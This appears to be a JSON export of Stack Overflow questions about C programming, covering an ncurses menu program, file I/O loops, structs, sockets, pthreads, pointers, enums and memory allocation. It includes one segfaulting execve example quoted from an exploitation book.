{fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1;  }\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1; }\n    fputs(\"172.16.254.0 \\n\", fp);\n    fputs(\"Server type = R \",ft);\n    fclose(ft);\n    fclose(fp);\n}\nvoid write_data1()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1; }\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1;}\n    fputs(\"172.16.254.1 \\n\", fp);\n    fputs(\"Server type = T \",ft);\n    fclose(ft);\n    fclose(fp);\n}\n\nvoid write_data2()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1;}\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1; }\n\n    fputs(\"172.16.254.2 \\n\", fp);\n    fputs(\"Server type = C \",ft);\n    fclose(ft);\n    fclose(fp);\n}\n\nvoid write_data3()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1; }\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1; }\n    fputs(\"172.16.254.3 \\n\", fp);\n    fputs(\"Server type = R \",ft);\n    fclose(ft);\n    fclose(fp);\n}\n\nvoid write_data4()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1;}\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1; }\n    fputs(\"172.16.254.4 \\n\", fp);\n    fputs(\"Server type = T \",ft);\n    fclose(ft);\n    fclose(fp);\n}\nvoid write_data5()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1; }\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1; }\n    fputs(\"172.16.254.5 \\n\", fp);\n    fputs(\"Server type = C \", ft);\n    fclose(ft);\n    fclose(fp);\n}\nvoid write_data6()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1;}\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1; }\n    fputs(\"172.16.254.6 \\n\", fp);\n    fputs(\"Server type = R \",ft);\n    fclose(ft);\n    fclose(fp);\n}\nvoid write_data7()\n{FILE *fp,*ft;\n    fp = fopen(\"file.txt\", \"w\");\n    ft = fopen(\"servertype.txt\",\"w\");\n    if(fp == NULL) {fprintf(stderr, \"Cannot open \\\"file.txt\\\" for appending\\n\");\n        return 1; }\n    if(ft == NULL) {fprintf(stderr, \"Cannot open \\\"servertype.txt\\\" for appending\\n\");\n        return 1; }\n    fputs(\"172.16.254.7 \\n\", fp);\n    fputs(\"Server type = T \",ft);\n    fclose(ft);\n    fclose(fp);\n}\n\n\n\nvoid delete_menu(WINDOW **items,int count)\n{\n    int i;\n    for (i=0;i&lt;count;i++)\n        delwin(items[i]);\n    free(items);\n}\nint scroll_menu(WINDOW **items,int count,int menu_start_col)\n{\n    int key;\n    int selected=0;\n    while (1) {\n        key=getch();\n        if (key==KEY_DOWN || key==KEY_UP) {\n            wbkgd(items[selected+1],COLOR_PAIR(2));\n            wnoutrefresh(items[selected+1]);\n            if (key==KEY_DOWN) {\n                selected=(selected+1) % count;\n            } else {\n                selected=(selected+count-1) % count;\n            }\n            wbkgd(items[selected+1],COLOR_PAIR(1));\n            wnoutrefresh(items[selected+1]);\n            doupdate();\n        } else if (key==KEY_LEFT || key==KEY_RIGHT) {\n            delete_menu(items,count+1);\n            touchwin(stdscr);\n            refresh();\n            items=draw_menu(20-menu_start_col);\n            return scroll_menu(items,8,20-menu_start_col);\n        } else if (key==ESCAPE) {\n            return -1;\n        } else if (key==ENTER) {\n            return selected;\n        }\n    }\n}\nint main()\n{\n    int key;\n    WINDOW *title,*messagebar,***submenu;\n\n    init_curses();\n\n    bkgd(COLOR_PAIR(1));\n    title=subwin(stdscr,1,80,0,0);\n    messagebar=subwin(stdscr,1,79,23,1);\n    submenu=subwin(draw_menu)\n\n    draw_title(title);\n    move(2,1);\n    printw(\"Press F1 or F2 to open the menus. \");\n    printw(\"ESC quits.\");\n    refresh();\n\n    do {\n        int selected_item;\n        WINDOW **menu_items;\n        key=getch();\n        werase(messagebar);\n        wrefresh(messagebar);\n        if (key==KEY_F(1)) {\n            menu_items=draw_menu(0);\n            selected_item=scroll_menu(menu_items,8,0);\n            delete_menu(menu_items,9);\n            if (selected_item&lt;0)\n                wprintw(messagebar,\"You haven't selected any item.\");\n            else if(selected_item==0){\n                wprintw(messagebar,\"You have selected menu SHAILENDRA SINGH.\",1);\n                write_data0();\n                if(fork())\n                    wait(0);\n                else\n                    execlp(\"clear\",\"clear\",(char *)NULL);\n                execlp(\"ls\",\"ls\",(char *)NULL);\n                execlp(\"konsole\",\"konsole\",(char *)NULL);\n                ESCAPE;\n                refresh();\n                delwin(title);\n                delwin(messagebar);\n\n                endwin();\n            }\n            else if(selected_item==1){\n                wprintw(messagebar,\"You have selected menu THINVENT TECH.\",2);\n                write_data1();\n            }\n            else if(selected_item==2){\n                wprintw(messagebar,\"You have selected menu THINCLIENT.\",3);\n                write_data2();\n            }\n            else if(selected_item==3){\n                wprintw(messagebar,\"You have selected menu SOLAR COMPUTING\",4);\n                write_data3();\n            }\n            else if(selected_item==4){\n                wprintw(messagebar,\"You have selected menu TECHNOCRATS.\",5);\n                write_data4();\n            }\n            else if(selected_item==5){\n                wprintw(messagebar,\"You have selected menu SENSORS.\",6);\n                write_data5();\n            }\n            else if(selected_item==6){\n                wprintw(messagebar,\"You have selected menu NCURSESLIB.\",7);\n                write_data6();\n            }\n            else if(selected_item==7){\n                wprintw(messagebar,\"You have selected menu GCCCOMPILER.\",8);\n                write_data7();\n            }\n\n            touchwin(stdscr);\n            refresh();\n        }\n\n    }\n    while (key!=ESCAPE);\n    delwin(title);\n    delwin(messagebar);\n\n    endwin();\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","file","fopen","infinite-loop"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":45,"score":3,"question_id":13271755,"title":"Infinite loop while trying to read from file","body":"<p>I wanted to read bytes from file and then rewrite them.\nI did like so:</p>\n\n<pre><code>FILE *fp;\nint cCurrent;\nlong currentPos;\n\n/* check if the file is openable */\nif( (fp = fopen(szFileName, \"r+\")) != NULL )\n{\n    /* loop for each byte in the file crypt and rewrite */\n    while(cCurrent != EOF)\n    {\n        /* save current position */\n        currentPos = ftell(fp);\n        /* get the current byte */\n        cCurrent = fgetc(fp);\n        /* XOR it */\n        cCurrent ^= 0x10;\n        /* take the position indicator back to the last position */\n        fseek(fp, currentPos, SEEK_SET);\n        /* set the current byte */\n        fputc(cCurrent, fp);\n    }\n</code></pre>\n\n<p>After executing the code on a file, the size of the file is increasing within an infinite loop.</p>\n\n<p>What is the problem in my code?</p>\n"},{"tags":["c","header","struct"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13271870,"title":"A struct defined in a separate header file","body":"<p>LMlib.h</p>\n\n<pre><code>#ifndef LMlib_H\n#define LMlib_H\n#endif\n\n#define MAX_IP_LENGTH 15         \n#define MAX_TABLE_ROWS 255\n\nstruct ForwardingTableRow\n{\n        char address[MAX_IP_LENGTH];\n        int subnetMask;\n        int interface;\n};\n\ntypedef struct ForwardingTableRow ForwardingTableRow;\n</code></pre>\n\n<p>LMlib.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include \"LMlib.h\"\n\nvoid ReadForwardingTable(FILE* f,ForwardingTableRow * table)\n{\n        int i;\n        for(i=0;i&lt;MAX_TABLE_ROWS;i++)\n        {\n                fscanf(f,\"%s %d %d\",&amp;table.address[i],&amp;table.subnetMask[i],&amp;table.interface[i]);\n        }\n\n\n}\n</code></pre>\n\n<p>Complier command:</p>\n\n<blockquote>\n  <p>cc LMlib.c LMlib.h main.c -lm</p>\n</blockquote>\n\n<p>Error:</p>\n\n<pre><code>LMlib.c: In function ‘ReadForwardingTable’:\nLMlib.c:11:27: error: request for member ‘address’ in something not a structure or union\nLMlib.c:11:45: error: request for member ‘subnetMask’ in something not a structure or union\nLMlib.c:11:66: error: request for member ‘interface’ in something not a structure or union\n</code></pre>\n\n<p>What have I done wrong? </p>\n"},{"tags":["c","boolean-logic","discrete-mathematics","proof"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":62,"score":6,"question_id":13271339,"title":"Logic Proof of Associative Property for XOR","body":"<p>I came across a common programming interview problem: given a list of unsigned integers, find the one integer which occurs an odd number of times in the list. For example, if given the list:</p>\n\n<pre><code>{2,3,5,2,5,5,3}\n</code></pre>\n\n<p>the solution would be the integer 5 since it occurs 3 times in the list while the other integers occur even number of times.</p>\n\n<p>My original solution involved setting up a sorted array, then iterating through the array: For each odd element I would add the integer, while for each even element I would subtract; the end sum was the solution as the other integers would cancel out.</p>\n\n<p>However, I discovered that a more efficient solution existed by simply performing an XOR on each element -- you don't even need a sorted array! That is to say:</p>\n\n<pre><code>2^3^5^2^5^5^3 = 5\n</code></pre>\n\n<p>I recall from a Discrete Structures class I took that the Associate Property is applicable to the XOR operation, and that's why this solution works:</p>\n\n<pre><code>a^a = 0\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>a^a^a = a\n</code></pre>\n\n<p>Though I remember that the Associative Property works for XOR, I'm having trouble finding a logical proof for this property specific to XOR (most logic proofs on the Internet seem more focused on the AND and OR operations). Does anyone know why the Associative Property applies to the XOR operation? </p>\n\n<p>I suspect it involves an XOR identity containing AND and/or OR.</p>\n"},{"tags":["c++","c","arrays","enums","index"],"answer_count":3,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":95,"score":3,"question_id":13257260,"title":"C - Pros/Cons of Enum-Indexed Arrays","body":"<p>In my experience, the real world rarely provides for indexes of nonnegative integers. Many things aren't even represented numerically. And many things with a numerically-represented index don't begin their indexes at 0. Why then are we still limited to integer-indexed arrays?</p>\n\n<p>Maybe I'm wrong, but it seems like enum indexed arrays are often more appropriate than numerically-indexed arrays (as enums are often more accurate, \"real-world\" representations). While enums can often be translated into C-style array indices with relative ease...</p>\n\n<pre><code>enum Weekday = {\n    SUNDAY,\n    MONDAY,\n    TUESDAY,\n    WEDNESDAY,\n    THURSDAY,\n    FRIDAY,\n    SATURDAY\n}\n\n// hopefully C doesn't allow nonsequential enum values; else pray to God\n// no one does something like setting Sunday = 4 and Saturday = 4096\nint numberOfDays = Saturday-Sunday+1;\n\nint hoursWorkedPerDay[numberOfDays];\n\nhoursWorkedPerDay[(int)SUNDAY] = 0;\nhoursWorkedPerDay[(int)MONDAY] = 8;\nhoursWorkedPerDay[(int)TUESDAY] = 10;\nhoursWorkedPerDay[(int)WEDNESDAY] = 6;\nhoursWorkedPerDay[(int)THURSDAY] = 8;\nhoursWorkedPerDay[(int)FRIDAY] = 8;\nhoursWorkedPerDay[(int)SATURDAY] = 0;\n</code></pre>\n\n<p>...we are still required to maintain consistency between the number of enums and the size of the array (however, this isn't an awful solution because there's not a more valid integer mapping for \"SUNDAY\" than 0), and more importantly, anything that can be cast to an int could still be dropped into the index to manipulate the array:</p>\n\n<pre><code>// continued from above\nvoid resetHours (void) {\n    int i = 0;\n    int hours = 0;\n    for (i = 0; i&lt;numberOfDays; i++) {\n        hoursWorkedPerDay[hours] = i;\n        // oops, should have been: \"...[i] = hours;\"\n        // an enum-indexed implementation would have caught this\n        // during compilation\n    }\n}\n</code></pre>\n\n<p>Furthermore, the entire conversion from enum to int is an entire layer of complexity that seems unnecessary.</p>\n\n<p>Can someone please explain whether there is validity to enum-indices, and list some pros and cons to each approach? And perhaps why a feature so seemingly useful is missing from the C standard, if such information exists?</p>\n"},{"tags":["c","arrays","2d","malloc","exc-bad-access"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13270899,"title":"2d matrix allocation function segfault (matrix returned by param)","body":"<p>i'm having a problem when trying to write the second row of the matrix (segfault <code>exc_bad_access</code> and <code>kern_invalid_address</code>) allocated with the following function:</p>\n\n<p>Here is my alloc function:</p>\n\n<pre><code>int amatrix(char*** m, const int i, const int j) \n{\n\n    int k;\n\n    (*m) = (char**) malloc(sizeof(char*) * i);\n    if ((*m) == NULL) {\n        return ERROR;\n    }\n\n    for (k = 0; k &lt; i; k++) {\n        (*m)[k] = (char*) malloc(sizeof(char) * j);\n        if ((*m)[k] == NULL) {\n            return ERROR;\n        }\n    }\n\n    return SUCCESS;\n}\n</code></pre>\n\n<p>I call it by using:</p>\n\n<pre><code>char** matrix;\nif (amatrix(&amp;matrix, i, j)) { ...\n</code></pre>\n\n<p><strong>Edit:</strong>\nAs requested:</p>\n\n<pre><code>#define ERROR 00\n#define SUCCESS 01\n</code></pre>\n\n<p>The access where the trouble is:</p>\n\n<pre><code>int gmatrix(char*** m, const int i, const int j)\n{\nint k, l;\n\nfor (k = 0; k &lt; i; k++) {\n    for (l = 0; l &lt; j; l++) {\n        printf(\"Matrix[%d][%d] = \", k, l);\n        scanf(\" %c\", m[k][l]);\n    }\n}\n\nreturn SUCCESS;\n}\n</code></pre>\n\n<p>Thank you for the quick replies!</p>\n"},{"tags":["c","arrays","pointers","char"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13271168,"title":"assigning values in loop to array of character pointers","body":"<p>I am brushing up basics of C and making a simple application but after spending lot of time with c++ and java C seems very hard.</p>\n\n<p>My problem is I can't assign values to a char array in loop doing it contains same value in every array value</p>\n\n<p>for example this works</p>\n\n<pre><code>char* foo[3];\n\nfoo[0] = \"mango\"; foo[1] = \"kiwi\"; foo[2] = \"banana\";\n\nint i=0; for(i=0;i&lt;3;i++) \n{\n   printf(\"%s\\n\",foo[i]); \n}\n</code></pre>\n\n<p>but this doesn't and I don't understand why.</p>\n\n<pre><code>char* foo[3]; int i=0;\n\nfor(i=0;i&lt;3;i++) {\n  char temp[5];\n  sprintf(temp,\"VAL:%d\",i);\n  foo[i] = temp; \n}\n\nfor(i=0;i&lt;3;i++) \n{\n  printf(\"%s\\n\",foo[i]); \n}\n</code></pre>\n\n<p>please help and thanks in advance </p>\n"},{"tags":["php","c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":37,"score":-4,"question_id":13268033,"title":"how to pass value from php to c","body":"<p>now I'm do some project. that i want to pass value (e.g. string int ) from php to c for use c to call shell script on centos and return value back to php for display the result of it. </p>\n\n<p>Who can be help me I want to see sample sourcecode of c &amp; php  </p>\n\n<p>hop anyone help thank</p>\n\n<p>I'm try to Control Shell script for start or stop virtual machine in my Project And return the value that back to php page by pass value from c I'm don't know how to do it please help. it is my final project </p>\n"},{"tags":["c","for-loop"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":60,"score":-6,"question_id":13268837,"title":"In c how do I enter a number then get that value and make it count 10 numbers on","body":"<p>How can I get a user to input a number then the program increments the users number by 10? </p>\n\n<p>for example the user enters 5 the number 5 increments like this 5 6 7 8 9 10 11 12 13 14 \n15</p>\n\n<p>This is my code so far. </p>\n\n<pre><code>int main (void)\n\n{\n\nint i;\n\nfor(i=1; i&lt;10; i++);\n\n{\nprintf(\"enter a number:\");\nscanf(\"%d\" , &amp;i);\n\n}\nreturn 0;\n}\n</code></pre>\n"},{"tags":["c","terminal"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":152,"score":0,"question_id":10519866,"title":"Get the terminal's name","body":"<p>I'm looking for how to get the name of the terminal emulator (« aterm », « xterm », « konsole », etc.) with C Programming langage (GNU/Linux). I have done several researches, but I didn't find anything.</p>\n"},{"tags":["c","string","pointers","char-array"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":13254721,"title":"Using Char Array Reference In Loop In C","body":"<p>If I have a char array in C I am using it in a loop:</p>\n\n<pre><code>char arr [100];\nwhile (1) {\n    fill arr from some source\n    store arr in some where\n}\n</code></pre>\n\n<p>Now, with this approach, I loose all the subsequent arrays, I maintain a pointer to the last one only. How can I maintain that? </p>\n\n<p>Please don't suggest using strings to me :)</p>\n"},{"tags":["c"],"answer_count":7,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":635,"score":1,"question_id":3753672,"title":"what is causing this segmentation fault? example from book","body":"<p>I am going through a book and I tried running this example but I receive a segmentation fault - gdb says it's when it sets argv[0] = filename;</p>\n\n<p>this code is copied/pasted straight from book's downloadable code samples.</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n\nint main() {\n  char filename[] = \"/bin/sh\\x00\";\n  char **argv, **envp; // arrays that contain char pointers\n\n  argv[0] = filename; // only argument is filename - segmentation fault here\n  argv[1] = 0;  // null terminate the argument array\n\n  envp[0] = 0; // null terminate the environment array\n\n  execve(filename, argv, envp);\n}\n</code></pre>\n\n<p>Edit: The book is Hacking: The Art of Exploitation by Jon Erickson, which has VERY good reviews.  This specific example is used as the first tutorial on converting C into machine code in the shellcode section, specifically it is exec_shell.c and can be downloaded from <a href=\"http://nostarch.com/hacking2/htm\" rel=\"nofollow\">http://nostarch.com/hacking2/htm</a> .  I imagine some context around the use of this code was necessary in order to avoid some of the negative comments below, sorry for leaving details out, and thanks for the help.</p>\n"},{"tags":["c","pthreads"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13270688,"title":"Use start_function from another source file when creating a pthread","body":"<p>In my main() method in one source file, I have a call to pthread_create(), as follows:</p>\n\n<pre><code>pthread_t pth_chanrecv;\npthread_create(&amp;pth_chanrecv, NULL, chanrecv_run, NULL);\n</code></pre>\n\n<p>\"chanrecv_run\" is a function in another source file that I have written.<br>\nThis is the function prototype:</p>\n\n<pre><code>void *chanrecv_run(void *arg);\n</code></pre>\n\n<p>The function prototype is in a header file which I have included in the source file containing the main() method.</p>\n\n<p>I'm compiling my program with the following statement:</p>\n\n<pre><code>gcc -lpthread -o bin/main2 src/main2.c\n</code></pre>\n\n<p>The chanrecv_run() function is in a file named \"chanrecv.c\", also in the src folder.</p>\n\n<p>Every time I try and compile it, I get the following error:</p>\n\n<pre><code>/tmp/ccHxRSTk.o: In function `main':\nmain2.c:(.text+0x256): undefined reference to `chanrecv_run'\ncollect2: ld returned 1 exit status\n</code></pre>\n\n<p>I have no idea what's going wrong. I've scoured the web trying to find another instance of someone trying to call a function that was in another file with the pthread_create function and come up completely blank. Is this even possible, and if so, how?</p>\n"},{"tags":["c","linux","linux-kernel","linux-device-driver","kernel-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13268824,"title":"maximum allocated memory by linux-kernel module","body":"<p>I want to write a module whose task is to capture the incoming packets without sending them to the user space application &amp; doing some modification on the captured packet. then this module will send this packet for transmission to the NIC.</p>\n\n<p>But main problem is that my module is very big in size &amp; it also does a lot of processing. So will it be good to do this processing inside kernel module or should we pass the information &amp; packet to the user space for processing to avoid complexity.</p>\n\n<p>&amp; i m doing it only for getting packet processing very quick.<br>\nso maximum how much memory could be allocated by a linux-kernel module.</p>\n\n<p>Please help!!!</p>\n"},{"tags":["python","c","sockets","pipes"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13269436,"title":"Socket communcation between C and Python","body":"<p>I just tried a really simple example to get started with sockets to communicate between a C app and Python. Here is the very simple Python script:</p>\n\n<pre><code>import socket\n\ns = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\ns.connect(\"/tmp/demo_socket\")\nprint \"Sending...\"\ns.send(\"Hello C from Python!\")\ndata = s.recv(1024)\ns.close()\nprint 'Received', repr(data)\n</code></pre>\n\n<p>And here the corresponding C code, without the headers:</p>\n\n<pre><code>int main(void)\n{  \n  struct sockaddr_un address;\n  int socket_fd, connection_fd;\n  socklen_t address_length;\n  pid_t child;  \n\n  char buffer[256];\n  int n;\n\n  socket_fd = socket(AF_UNIX, SOCK_STREAM, 0);\n  if (socket_fd &lt; 0){\n      printf(\"socket() failed\\n\");\n      return 1;\n  } \n\n  unlink(\"/tmp/demo_socket\");\n  memset(&amp;address, 0, sizeof(struct sockaddr_un));\n\n  address.sun_family = AF_UNIX;\n  snprintf(address.sun_path, UNIX_PATH_MAX, \"/tmp/demo_socket\");\n\n  if (bind(socket_fd, (struct sockaddr *) &amp;address, sizeof(struct sockaddr_un)) != 0) {\n      printf(\"bind() failed\\n\");\n      return 1;\n  }\n  if(listen(socket_fd, 5) != 0) {\n      printf(\"listen() failed\\n\");\n      return 1;\n  }\n\n  address_length = sizeof(address);  \n  while((connection_fd = accept(socket_fd, \n                   (struct sockaddr *) &amp;address,\n                   &amp;address_length)) &gt; -1)\n  {\n      printf(\"successfully received data\\n\");\n      bzero(buffer,256);\n      n = read(connection_fd,buffer,255);\n      if (n &lt; 0) error(\"ERROR reading from socket\");\n         printf(\"Here is the message: %s\\n\\n\", buffer);\n      strcpy(buffer, \"Hi back from the C world\"); \n      n = write(connection_fd, buffer, strlen(buffer));\n      if (n &lt; 0) \n         printf(\"ERROR writing to socket\\n\");           \n      break;      \n  }\n  close(socket_fd);\n  close(socket_fd);\n  return(0);\n}\n</code></pre>\n\n<p>The output is then as follows when running them in parallel:</p>\n\n<pre><code> Successfully received data\n Here is the message: Hello C from Python!\n\n ERROR writing to socket\n close failed in file object destructor:\n Error in sys.excepthook:\n\n Original exception was:\n</code></pre>\n\n<p>So the good news is, receiving stuff from the Python world works fine, but I get an error when trying to write something back, plus it seems I get an exception in the end. Anyone an idea what I am doing wrong here?</p>\n\n<p>EDIT: Thanks guys, I did the correction that you suggested, the message exchange works fine, just the C-application is still causing trouble and I am not sure why...</p>\n\n<pre><code>close failed in file object destructor:\nError in sys.excepthook:\n\nOriginal exception was:\n</code></pre>\n"},{"tags":["c","algorithm"],"answer_count":6,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":9625,"score":6,"question_id":4529819,"title":"Finding common elements in two arrays of different size","body":"<p>I have a problem to find common elements in two arrays and that's of different size.</p>\n\n<p>Take , Array <code>A1</code> of size <code>n</code> and Array <code>A2</code> of size <code>m</code>, and <code>m != n</code></p>\n\n<p>So far, I've tried to iterate lists one by one and copy elements to another list. If the element already contains mark it, but I know it's not a good solution.</p>\n"},{"tags":["c++","c","emacs","semantic","cedet"],"answer_count":1,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":2383,"score":7,"question_id":2600585,"title":"Emacs, Cedet and semantic","body":"<p>I've configured CEDET for emacs following <a href=\"http://alexott.net/en/writings/emacs-devenv/EmacsCedet.html\" rel=\"nofollow\">Alex article</a> (great!!). \nNow, the questions:</p>\n\n<ol>\n<li>I've generated GTAGS with Gnu Global in my <code>/usr/include</code>, how can i check if semantic is using GTAGS?</li>\n<li>Can I keep my GTAGS in another directory and instruct semantic to use that dir?</li>\n<li>In C/C++ sources, completion on include statement (from system\nheaders) doesn't list all available headers. Ok, this is a stupid\nproblem.. but makes me think something is not working right</li>\n</ol>\n"},{"tags":["c","cmake","ftdi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13268431,"title":"How to avoid library finding CMakeLists feature","body":"<p>I'm trying to adjust 3rd person code to my needs. This code is provided with CMake config files used to build and install it. There is possibility to choose one of libraries. And in code is often used <code>#ifdef USE_FTD2XX</code> directive. I saw that this is defined in CMamkeFiles.txt file like here:</p>\n\n<pre><code>option(USE_FTD2XX \"Use FTDI libFTD2XX instead of free libftdi\" ON)\n\nif(USE_FTD2XX)\n  find_package(libFTD2XX)\nendif(USE_FTD2XX)\n\nif(LIBFTD2XX_FOUND)\n  include_directories(${LIBFTD2XX_INCLUDE_DIR})\n  add_definitions( -DUSE_FTD2XX )\nelse(LIBFTD2XX_FOUND)\n  set(LIBFTD2XX_LIBRARIES \"\")\nendif(LIBFTD2XX_FOUND)\n</code></pre>\n\n<p>But if I simply use *.c and *.cpp files and I analyse and run it simply from IDE (Codeblocks), how could I set using this library in C++ code instead of in CMake? I'm also sure that I want use always this one so it can be fixed.</p>\n\n<p>Should I simply <code>#define USE_FTD2XX</code> in main file?</p>\n"},{"tags":["c","arrays","pointers","sizeof","void"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":45,"score":-1,"question_id":13250728,"title":"pointers to array - c programming","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1975128/sizeof-an-array-in-the-c-programming-language\">Sizeof an array in the C programming language?</a><br>\n  <a href=\"http://stackoverflow.com/questions/11622146/why-sizeofparam-array-is-the-size-of-pointer\">Why sizeof(param_array) is the size of pointer?</a>  </p>\n</blockquote>\n\n\n\n<pre><code>void printSizeOfArray(int a[])\n{\n    printf(\"%lu\\n\", sizeof(a));\n}\n\nint main()\n{\n    int it;\n    int a[4] = {0};\n    printSizeOfArray(a);\n\n    return 0;\n}\n</code></pre>\n\n<p>When I run the code I get 8. Why is a pointer to an array a pointer of type void?</p>\n\n<p>And if a pointer to an array is of type void, why, when I write:</p>\n\n<pre><code>int *it;\nint a[4] = {0};\nit = a;\nprintf(\"%lu\\n\", sizeof(it));\n</code></pre>\n\n<p>It works ok as well? How can I point with an <code>int</code>?</p>\n\n<p>Also, why does it print 8 in the second and not 4? It is a pointer to array (<code>void*</code>) and not an <code>int</code>.</p>\n"},{"tags":["c","pointers","enums"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13251351,"title":"What is this * (dereferencing operator ) doing in enum declaration?","body":"<p>In code walk-through into some others code I found <code>*</code> \nWhat is this ?</p>\n\n<p>here is the same prototype of that code and it's not giving any error.\nOnly warning comes with <code>gcc 4.5.2</code> But on windows it's not giving warning and compiles properly. I can't provide actual code due to IP of the company but I wanted to know this how and why this is correct? </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\ntypedef enum e\n{\n        a,\n        b,\n        c\n}x,*y;\n\nint main()\n{\n        x t=4;\n        printf(\"x : %d\\n\",t);\n        y m=5;\n        printf(\"*y : %d\\n\",m);\n        return 0;\n}\n</code></pre>\n"},{"tags":["c","math","64bit","overflow","32bit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":70,"score":-1,"question_id":13251337,"title":"C arithmetic overflow difference between 32bit and 64bit?","body":"<p>I wonder if there is any difference by checking arithmetic overflows for 32bit and 64bit?\n(except the limits..)</p>\n\n<p>For example for 32 bit multiplication <code>a * b</code>:</p>\n\n<pre><code>if(b &gt; 0 &amp;&amp; a &gt; UINT32_MAX_VALUE / b) {\n//Overflow\n} \n</code></pre>\n\n<p>Can I use the same logic for 64 bit multiplication?\nlike:</p>\n\n<pre><code>if(b &gt; 0 &amp;&amp; a &gt; UINT64_MAX_VALUE / b) {\n//Overflow\n} \n</code></pre>\n\n<p>are there any traps when I have to check 64 bit overflow with signed / unsigned?</p>\n"},{"tags":["c","timer","timing"],"answer_count":5,"favorite_count":15,"up_vote_count":11,"down_vote_count":0,"view_count":5080,"score":11,"question_id":459691,"title":"Best timing method in C?","body":"<p>What is the best way to time a code section with high resolution and portability?</p>\n\n<pre><code>/* Time from here */\nProcessIntenseFunction();\n/* to here. */\n\nprintf(\"Time taken %d seconds %d milliseconds\", sec, msec);\n</code></pre>\n\n<p>Is there a standard library that would have a cross-platform solution?</p>\n"},{"tags":["c++","c","signals","posix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13269838,"title":"Thread and system signals","body":"<p>I'm programing a multithreaded program that needs to intercept system signals (such as SIGINT). I would like to know if there is a normalized way to \"catch\" these signals like:</p>\n\n<ul>\n<li>A Signal is sent, may any thread receive it or only the main() one ?</li>\n<li>Is there a Posix rule or a programming idiom that specifies how to handle this ? </li>\n</ul>\n"},{"tags":["c","linux","gcc","fedora","glibc"],"answer_count":5,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":1174,"score":5,"question_id":4803152,"title":"mmap fails when length is larger than 4GB","body":"<p>(The correct code is in 'Update 5')</p>\n\n<p>I tried to map a range of memory from 0x100000000 to 0x200000000 in this example C code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;sys/mman.h&gt;\n\nint 